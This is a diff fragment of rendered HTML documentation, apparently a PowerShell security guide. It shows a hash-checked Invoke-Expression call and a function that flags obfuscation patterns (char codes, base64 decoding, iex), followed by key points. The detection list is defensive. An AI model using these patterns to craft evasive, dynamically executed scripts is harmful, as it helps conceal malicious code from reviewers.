+<span class="k">if</span> <span class="p">((</span><span class="nb">Get-FileHash</span> <span class="n">-InputStream</span> <span class="nv">$stream</span><span class="p">).</span><span class="n">Hash</span> <span class="o">-eq</span> <span class="nv">$expectedHash</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">Invoke-Expression</span> <span class="nv">$script</span>
+<span class="p">}</span>
+
+<span class="c">## Good - Detect obfuscation</span>
+<span class="k">function</span> <span class="nb">Test-ScriptObfuscation</span> <span class="p">{</span>
+    <span class="k">param</span><span class="p">(</span><span class="no">[string]</span><span class="nv">$ScriptPath</span><span class="p">)</span>
+
+    <span class="nv">$content</span> <span class="p">=</span> <span class="nb">Get-Content</span> <span class="nv">$ScriptPath</span> <span class="n">-Raw</span>
+
+    <span class="nv">$suspiciousPatterns</span> <span class="p">=</span> <span class="p">@(</span>
+        <span class="s1">&#39;[char]\(\d+\)&#39;</span><span class="p">,</span>  <span class="c"># Char code obfuscation</span>
+        <span class="s1">&#39;\$\w+\s*=\s*[&#39;&#39;&quot;][^&#39;&#39;&quot;]+[&#39;&#39;&quot;]\s*\+&#39;</span><span class="p">,</span>  <span class="c"># String concatenation obfuscation</span>
+        <span class="s1">&#39;-join\s*\(&#39;</span><span class="p">,</span>  <span class="c"># Join obfuscation</span>
+        <span class="s1">&#39;iex|Invoke-Expression&#39;</span><span class="p">,</span>  <span class="c"># Dynamic execution</span>
+        <span class="s1">&#39;\[Convert\]::FromBase64String&#39;</span>  <span class="c"># Base64 encoding</span>
+    <span class="p">)</span>
+
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$pattern</span> <span class="k">in</span> <span class="nv">$suspiciousPatterns</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$content</span> <span class="o">-match</span> <span class="nv">$pattern</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nb">Write-Warning</span> <span class="s2">&quot;Suspicious pattern detected: $pattern&quot;</span>
+            <span class="k">return</span> <span class="nv">$false</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$true</span>
+<span class="p">}</span>
+</code></pre></div>
+<p><strong>Key Points</strong>:</p>
+<ul>
+<li>Never obfuscate your own scripts</li>
+<li>Detect and reject obfuscated scripts</li>
+<li>Be suspicious of base64, char codes, string concatenation</li>
+<li>Use PSScriptAnalyzer to detect suspicious patterns</li>
+<li>Review scripts before execution</li>
+<li>Implement application whitelisting</li>
+</ul>
 <hr />
 <h2 id="tool-configurations">Tool Configurations<a class="headerlink" href="#tool-configurations" title="Permanent link">&para;</a></h2>
 <h3 id="vscode-settingsjson">VSCode settings.json<a class="headerlink" href="#vscode-settingsjson" title="Permanent link">&para;</a></h3>
